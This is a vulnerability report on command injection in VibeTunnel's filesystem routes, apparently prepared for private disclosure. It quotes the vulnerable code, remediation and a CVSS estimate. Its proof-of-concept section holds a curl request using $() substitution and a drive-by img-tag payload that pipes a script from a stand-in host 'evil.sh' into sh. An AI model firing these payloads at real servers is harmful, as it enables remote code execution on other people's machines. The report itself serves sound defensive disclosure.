# Security Report — Command Injection in VibeTunnel filesystem routes (`/api/fs/diff`, `/api/fs/preview`)

**Status:** Candidate finding — pending dedup against existing advisories and maintainer confirmation.
**Reporter:** External security research (CodeQL-assisted triage).
**Project:** [amantus-ai/vibetunnel](https://github.com/amantus-ai/vibetunnel)
**Analyzed revision:** `f78324f5a6f5617711581cf5b119651094b2d9bc` (web `1.0.0-beta.18`)
**Class:** OS Command Injection (CWE-78)
**Component:** `web/src/server/routes/filesystem.ts`

---

## Summary

Two HTTP `GET` endpoints in the VibeTunnel web server pass a client-supplied path into a
**shell-interpreted** command string without neutralizing shell metacharacters. The
path-safety gate that is supposed to guard these routes, `isPathSafe()`, has been replaced
with a no-op that always returns `true`. A request whose `path` parameter contains a shell
command substitution (`$(...)` or back-ticks) therefore executes that command on the host
running the server.

Because the endpoints are **`GET`** requests with **no CSRF protection**, the most practical
exploitation path is a **drive-by / cross-site** attack: any web page the victim visits can
issue the request against the victim's local VibeTunnel server. This is especially impactful
when the server is started with `--allow-local-bypass` (localhost connections skip
authentication) or `--no-auth`.

---

## Affected code

### 1. The guard is disabled

`web/src/server/routes/filesystem.ts:41`

```ts
function isPathSafe(_requestedPath: string, _basePath: string): boolean {
  // Security check disabled - allow access to all directories
  return true;
}
```

This stub is called by eight route handlers (lines 132, 311, 392, 433, 465, 512, 592, 641)
as their only path validation, so none of them actually restrict or sanitize the path.

### 2. Sink A — `GET /api/fs/diff`

`web/src/server/routes/filesystem.ts:460-476`

```ts
router.get('/fs/diff', async (req, res) => {
  const requestedPath = req.query.path as string;          // attacker-controlled
  ...
  if (!isPathSafe(requestedPath, process.cwd())) { ... }    // no-op, always passes
  const fullPath = path.resolve(process.cwd(), requestedPath);
  const relativePath = path.relative(process.cwd(), fullPath);
  const { stdout: diff } = await execAsync(                 // runs via /bin/sh
    `git diff HEAD -- "${relativePath}"`,                   // <-- interpolated into shell string
    { cwd: process.cwd() }
  );
```

`path.resolve()` / `path.relative()` normalize `..` and separators but **do not remove shell
metacharacters** (`$`, `` ` ``, `\`). Inside the double quotes, `$(...)` and back-tick command
substitution are still evaluated by the shell.

### 3. Sink B — `GET /api/fs/preview` (HEAD content path)

`web/src/server/routes/filesystem.ts:528-536`

```ts
const gitPath = `./${relativePath}`;
const { stdout } = await execAsync(`git show HEAD:"${gitPath}"`, { cwd: process.cwd() });
```

Same taint source (`req.query.path` → `relativePath`), same shell-string interpolation.

---

## Proof of concept

With a VibeTunnel server reachable (default bind is `0.0.0.0:4020`), and the caller able to
reach `/api` (authenticated, or via `--allow-local-bypass` from localhost, or `--no-auth`):

```bash
# Creates /tmp/vibetunnel-pwned on the server host
curl 'http://TARGET:4020/api/fs/diff?path=$(touch%20%2Ftmp%2Fvibetunnel-pwned)'
```

The server runs `git diff HEAD -- "$(touch /tmp/vibetunnel-pwned)"`; the shell evaluates the
substitution first, executing `touch /tmp/vibetunnel-pwned`. Any command can be substituted
(e.g. reverse shell). `path.resolve`/`path.relative` leave the `$()` intact because it is not
a path-traversal sequence.

### Drive-by (CSRF) variant

Because it is a `GET` with no CSRF token, a page the victim merely visits can trigger it
against their own machine:

```html
<img src="http://localhost:4020/api/fs/diff?path=$(curl%20evil.sh|sh)">
```

If the victim runs with `--allow-local-bypass` (a documented convenience for local use), the
localhost origin bypasses authentication and the command runs — no credentials needed by the
attacker.

---

## Impact and attack scenarios

| Deployment | Reachability | Severity |
|---|---|---|
| `--no-auth` | Any network client (bind `0.0.0.0`) | Unauthenticated RCE |
| `--allow-local-bypass` | Any website the victim visits (CSRF, GET) | Drive-by RCE, no creds |
| Default (auth on, bind `0.0.0.0`) | Authenticated clients, or CSRF if a session/token is usable cross-site | Authenticated RCE / escalation |

Note on the "authenticated user already has a terminal" argument: even where the caller is a
legitimately authenticated VibeTunnel user, this is still a defect worth fixing — it widens
the attack surface to CSRF (a terminal session does not), and the disabled `isPathSafe` stub
means the eight filesystem endpoints also have no directory confinement, allowing arbitrary
host filesystem read beyond any intended workspace.

---

## Root cause

1. **Guard removed** — `isPathSafe()` was turned into `return true` ("Security check
   disabled"), so no endpoint validates the path.
2. **Shell string construction** — the git commands are built by interpolating a
   client-derived value into a string passed to `exec`/`execAsync` (which invoke `/bin/sh`),
   rather than being passed as an argument vector.

---

## Remediation

**Primary fix — do not use a shell.** Pass arguments as an argv array with `execFile`, so the
path is a single literal argument and shell metacharacters are inert:

```ts
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
const execFileAsync = promisify(execFile);

// diff
await execFileAsync('git', ['diff', 'HEAD', '--', relativePath], { cwd: process.cwd() });

// preview — note git's own "end of options" and pathspec handling
await execFileAsync('git', ['show', `HEAD:./${relativePath}`], { cwd: process.cwd() });
```

**Defense in depth:**
- Restore a real `isPathSafe()` that resolves the path and verifies it is contained within an
  allowed base directory (`path.resolve(base, p)` then check `resolved.startsWith(base + sep)`,
  rejecting symlink escapes).
- Treat these as state-changing/side-effecting for CSRF purposes, or require a non-GET method
  plus an anti-CSRF token / `Sec-Fetch-Site` origin check, so cross-site requests cannot reach
  them.
- Reconsider the default `--bind 0.0.0.0`; binding to `127.0.0.1` by default reduces network
  exposure.

---

## Suggested CVSS (provisional)

For the `--allow-local-bypass` + CSRF drive-by path:
`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` ≈ **8.8 (High)** — user interaction is only "visit a
web page." For `--no-auth`, UI:N raises it toward Critical. For the default authenticated case
it is lower (PR:L). Final rating depends on the maintainer's intended threat model.

---

## Dedup status (checked 2026-11-06)

- **Still present on `main`** — the `isPathSafe` stub (`return true`) and both
  `execAsync(\`git diff … "${relativePath}"\`)` / `execAsync(\`git show HEAD:"${gitPath}"\`)`
  sinks are confirmed live on the current default branch. Repo last pushed 2026-08-05, so
  `main` equals the analyzed revision `f78324f`. **Not fixed.**
- **No published advisory** — empty repository Security Advisories list; nothing
  vibetunnel-specific in the global GHSA database.
- **No known issue/PR** for this specific command injection.
- **Related context**: a prior closed PR *"fix(security): env scrub, safe paths, private
  uploads, auth gaps, CSP"* touched this file area but left the guard disabled and the shell
  interpolation intact. The `// Security check disabled` comment suggests broad filesystem
  *access* is an intentional choice for a terminal tool; the *command injection* via `$()` is
  the unintended, separable defect this report concerns.

## Before filing

- [ ] Re-confirm `main` HEAD immediately before submission (state above is as of 2026-11-06).
- [ ] Confirm `authMiddleware` behavior for GET `/api/fs/*` under each flag combination.
- [ ] Report privately via the project's security policy (GitHub "Report a vulnerability"),
      not a public issue.
